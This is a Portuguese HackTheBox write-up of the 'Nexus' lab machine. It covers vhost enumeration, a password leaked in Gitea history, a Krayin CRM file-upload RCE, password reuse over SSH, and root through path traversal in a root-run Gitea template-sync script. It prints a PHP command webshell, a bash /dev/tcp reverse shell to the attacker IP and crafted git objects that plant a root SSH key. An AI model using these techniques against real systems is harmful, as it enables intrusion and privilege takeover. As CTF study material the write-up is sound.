# Nexus

## informações da máquina

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **dificuldade** | Easy |
| **OS** | Linux |
| **IP** | 10.129.112.214 |
| **técnicas** | vHost enumeration, Git history, CVE-2026-38526 (unrestricted file upload), credential disclosure, password reuse, Gitea template sync path traversal |
| **link HTB** | [https://app.hackthebox.com/machines/Nexus](https://app.hackthebox.com/machines/Nexus) |

## resumo

a máquina expõe um Gitea em `git.nexus.htb` que vaza senha de aplicação no histórico de um repositório. a senha dá acesso ao Krayin CRM em `billing.nexus.htb`, onde o upload de anexos no composer de email (CVE-2026-38526) entrega RCE como `www-data`. o `.env` do Krayin expõe a senha live do banco, reutilizada pelo usuário `jones` no SSH. um timer systemd roda como root um script de "template sync" que grava arquivos de repos Gitea marcados como template usando `os.path.join()` sem sanitizar `..` — objetos git crus com path traversal escrevem nossa chave pública em `/root/.ssh/authorized_keys`.

## enumeração/scanning

### port scanning

```bash
sudo nmap -p- --min-rate 5000 -sS -Pn -n -oA scans/nexus-alltcp 10.129.112.214
sudo nmap -sC -sV -p22,80 -Pn -n -oA scans/nexus-services 10.129.112.214
```

**portas abertas:**
- 22/tcp - OpenSSH 9.6p1 Ubuntu
- 80/tcp - nginx 1.24.0 (redireciona para `nexus.htb`)

só SSH e HTTP: o caminho é web, e o redirect define o FQDN base para vhost fuzzing.

### vHost enumeration

```bash
ffuf -c -w /home/kp/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://nexus.htb/ -H 'Host: FUZZ.nexus.htb' -fw 4
```

**vhosts encontrados:** `git.nexus.htb` (200), `billing.nexus.htb` (302). no `/etc/hosts`:

```bash
10.129.112.214 nexus.htb
10.129.112.214 git.nexus.htb billing.nexus.htb
```

o site raiz não tem função explorável; os vhosts escondem o Gitea (fonte de credenciais) e o CRM (alvo delas).

## exploitation

### Gitea: credencial no histórico

em `git.nexus.htb`, o repositório `admin/krayin-docker-setup` expõe um `.env` no histórico de commits:

```text
Commit 9b817fa4e073d12fc43952acb09f3067b2f17adf
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
```

a página de carreiras em `nexus.htb` lista `j.matthew@nexus.htb` como contato — nome de usuário candidato para o CRM. senha de aplicação vaza em commit antigo, e o site público fornece o email do gestor que a usa.

### Krayin CRM: login e upload (CVE-2026-38526)

login no `billing.nexus.htb` com `j.matthew@nexus.htb` + senha vazada. versão: Krayin 2.2.0, vulnerável ao CVE-2026-38526 (unrestricted file upload via composer de email): o anexo pode ser renomeado para `.php` na requisição interceptada e o arquivo fica servido sob `/storage/`.

primeira tentativa: payload msfvenom `php/reverse_php` (LHOST 10.10.15.4, LPORT 4455):

```text
nc -lvnp 4455
Ncat: Connection from 10.129.112.214:41262.
```

callback chegou, sem prompt. payloads `php/reverse_php` leem comandos do socket e não imprimem prompt — parecem mortos em `nc` puro. antes de debugar payload, confirmar execução de comando com algo mínimo:

```php
<?php system($_GET["cmd"] ?? "id"); ?>
```

```text
http://billing.nexus.htb/storage/emails/2/nexus-cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

com `nc`, `python3` e `bash` presentes no alvo, shell www-data seria trivial (`bash -c 'bash -i >& /dev/tcp/10.10.15.4/4455 0>&1'`), mas distinguir "payload não mostra prompt" de "execução falhou" definiu o rumo: em vez de persistir na reverse shell, seguir direto para recon e credenciais.

### recon como www-data

```text
cat /var/www/krayin/.env   ->  DB_USERNAME=krayin / DB_PASSWORD=y27xb3ha!!74GbR
```

a senha live do banco difere da vazada no Gitea. outros achados:

```text
cat /proc/1/cgroup  -> 0::/init.scope (host, não container)
ls /home            -> git, jones
sudo -n -l          -> "a password is required"
find / -perm -4000  -> conjunto padrão, nada anômalo
```

o banco local (`mysql -ukrayin -p'...' krayin`) tem 62 tabelas; `users` revela o admin do CRM (`james`, hash bcrypt) — nada quebrável na hora. duas senhas candidatas agora existem, e os únicos usuários reais são `jones` e `git`.

## acesso como jones

matriz de teste de password reuse contra SSH:

```text
jones / N27xh!!2ucY04   -> negado
jones / y27xb3ha!!74GbR -> uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
git   / N27xh!!2ucY04   -> negado
git   / y27xb3ha!!74GbR -> negado
```

a senha live do banco é reutilizada por `jones` (a senha vazada no Gitea só servia para o CRM). foothold via SSH, sem precisar de reverse shell.

```text
jones@nexus:~$ cat user.txt
```

**user flag:** ✓

recon como jones: sem sudo, sem crontab, `/opt` e `/srv` vazios, nada gravável pelo grupo `users`. portas locais: 3306/33060 (mysql), 3000 (Gitea atrás do nginx). o descarte das privesc usuais (sudo/SUID/grupo) aponta para os serviços sob medida — o Gitea e o que roda junto dele.

## privilege escalation

### Gitea template sync

`/etc/gitea/` contém `template-sync.py` (legível por todos) e o systemd confirma:

```text
systemctl cat gitea-template-sync.service
  User=root
  ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py

systemctl list-timers
  gitea-template-sync.timer  (~1-2 min)
```

o script lista repos Gitea marcados como template via API e copia cada arquivo do tree para o staging:

```python
target = os.path.join(stage_path, filepath)   # filepath vem de git ls-tree, sem sanitização
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

paths com `..` no tree escapam de `/home/git/template-staging/<owner>/<repo>/`. o git impede `..` em commits normais (`verify_path()`), mas objetos escritos direto em `.git/objects/` não passam por essa checagem.

### exploração

login no Gitea como `jones` usa a mesma senha reutilizada. repo criado como template via API:

```bash
curl -s -u "jones:y27xb3ha!!74GbR" -X POST 'http://git.nexus.htb/api/v1/user/repos' \
  -H 'Content-Type: application/json' \
  -d '{"name":"rce","private":false,"template":true,"auto_init":false}'
```

clone e craft dos objetos: blob com a chave pública, tree `root -> .ssh -> authorized_keys` embrulhada em 5 entradas `..`, commit escrito direto em `.git/objects/`, ref `main` atualizada. cinco níveis de `..` porque `rce -> jones -> template-staging -> git -> home -> /`.

```text
git ls-tree -r HEAD
100644 blob 7db1f16...  ../../../../../root/.ssh/authorized_keys

git push -u origin main --force
 * [new branch] main -> main
```

timer às 17:19:19 (`/var/log/template-sync.log`):

```text
[2026-08-28 17:19:19]   synced: README.md
[2026-08-28 17:19:19]   synced: ../../../../../root/.ssh/authorized_keys
```

```bash
ssh -i /tmp/.k root@10.129.112.214 'id; cat /root/root.txt'
uid=0(root) gid=0(root) groups=0(root)
```

**root flag:** ✓

cada peça era necessária: serviço como root, repo marcado como template, objetos crus para passar pelo `verify_path()`, e a contagem exata de `..` para acertar `/root`.

## lições aprendidas

- credencial vazada em histórico de git não é só a senha "atual": a senha live do banco era outra — testar todas as variantes contra todos os serviços.
- payload que conecta sem prompt não significa execução quebrada: `php/reverse_php` espera comandos no socket. confirmar RCE com webshell mínimo antes de debugar payload.
- senha de banco em `.env` de Laravel/Krayin é candidata padrão de password reuse para usuários do sistema.
- serviço systemd que sincroniza conteúdo de repo para o filesystem é privesc em potencial: checar `User=`, checar sanitização de path, checar quem controla o repo.
- `git verify_path()` impede `..` em operações normais, mas objetos loose escritos manualmente contornam a checagem — o consumidor downstream (script python com `os.path.join`) assumiu que o input era seguro.
- timer de ~1-2 min: run com repo vazio falha com "Not a valid object name HEAD" — o log de falha também é evidência de timing.

---

*writeup by kp*